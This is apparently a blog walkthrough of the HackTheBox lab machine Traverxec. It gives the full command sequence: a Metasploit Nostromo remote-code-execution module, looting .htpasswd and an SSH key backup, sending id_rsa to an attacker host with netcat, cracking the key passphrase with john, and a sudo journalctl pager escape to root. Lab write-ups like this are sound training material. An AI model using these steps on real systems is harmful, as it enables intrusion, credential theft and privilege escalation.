---
title: "HackTheBox: Traverxec | Walkthrough"
date: 2020-04-11
categories: [hackthebox]
tags: [nostromo, linux, hackthebox]
---

## Enumeration

Checking connection:

```sh
ping 10.10.10.165
```

Finding out more about the webserver:

```sh
nmap -A 10.10.10.165 -o nmapresults.txt
```

We see that on port 80, there's a Nostromo service running. Let's see if there's an exploit for it.

Checking for an exploit:

```sh
searchsploit nostromo
```

So there are a few. Let's try and use the Metasploit one for the ease of use.

## Initial Foothold

Trying to use the exploit:

```sh
msfconsole
     search nostromo
     use exploit/multi/http/nostromo_code_exec
     show options
     set RHOSTS 10.10.10.165
     set LHOST 10.10.14.99
     run
```

Nice we do get a shell. Let's improve it now.

To get a better shell:

```sh
 python -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
```

## User

Finding the web server:

```sh
 ls -al /var/
 ls -al /var/nostromo
```

We see the conf directory, checking it:

```sh
cd /var/nostromo/conf
ls -al
```

We see a hidden file, `.htpasswd`

```sh
cat .htpasswd
```

Nice, now we have david's credentials. Poor david.

Now, let’s check the other file, `nhttpd.conf`

```sh
cat nhttpd.conf
```

We can see that the homedirs should ring a bell in your head.

Can we go into david's home directory?

```sh
cd /home/david
```

So, we can enter this directory, let's try to see what's in it.

```sh
ls -al
```

It says permission denied, interesting, we can access the directory but not list the files.

```sh
ls -ld .
```

So, it seems that we have execute permissions in this directory but not read permissions, weird.
We know that there's a user.txt file in this directory, so let's check for it.

```sh
ls -l user.txt
```

We can see that the file exists, meaning if we know the name of the file, maybe we will be able to execute it.

```sh
ls -l public_www
```

Damn, so the file actually exists here. Lets copy it somewhere else.

```sh
mkdir /tmp/public_www ; cp public_www/* /tmp/public_www
cd protected-file-area
tar zxvf backup-ssh-identity-files.tgz
```

We get a backup of ssh files.

Now, in another terminal, in our attacking machine, let's set up a netcat listener to transfer the id_rsa file.

```sh
nc -nvlp 4444 > id_rsa
```

Now, back in the traverxec machine, let's send that file over:

```sh
nc 10.10.11.99 444 < id_rsa
```

Now, back in our own machine, to use that `id_rsa` file, we need its password. 
So, we'll have to crack it. For that, we will use `ssh2john` and then, use `john` to crack it.

```sh
updatedb
locate ssh2john #finding ssh2john
cp $(locate ssh2john) ~/HTB/Traverxec #copy it to your working directory
python ssh2john.py id_rsa > id_rsa.hash #converting it
cp $(locate rockyou.txt) ~/HTB/Traverxec #copying the rockyou.txt password file
gunzip rockyou.txt.gz #unziping rockyou.txt
john -wordlist=rockyou.txt id_rsa.hash #cracking the password with john
```

Now, it should give a password.
Now, let's try to ssh into the machine using the `id_rsa` file and the password.
Before we use the `id_rsa` file, let's change the permissions to 600.

```sh
ssh david@10.10.10.165 -i id_rsa
```

Enter the password.

Nice, You are IN!

```sh
cat user.txt
```

## Root

Now, for root, its pretty simple.

```sh
cd bin

cat server-stats.sh
```

We can see that, in the last line, the sudo command is used. Let's check this script.

```sh
./server-stats.sh
```

It doesn't ask for password, that's nice.

Let's try running the command that it runs:

```sh
sudo /usr/bin/journalctl -n5 -unostromo.service
```

Now, the command ran as sudo, we can probably take advantage of it.

Let's quit the terminal from full screen and make it a normal window and run that command again:
Now, `journalctl` opens with less, we can probably execute a command here and it should run as 
root as we have run the `journalctl` command as root with sudo.

```sh
:!/bin/bash
```

Nice, now you should have a new bash shell and you should be root!
Congratulations!
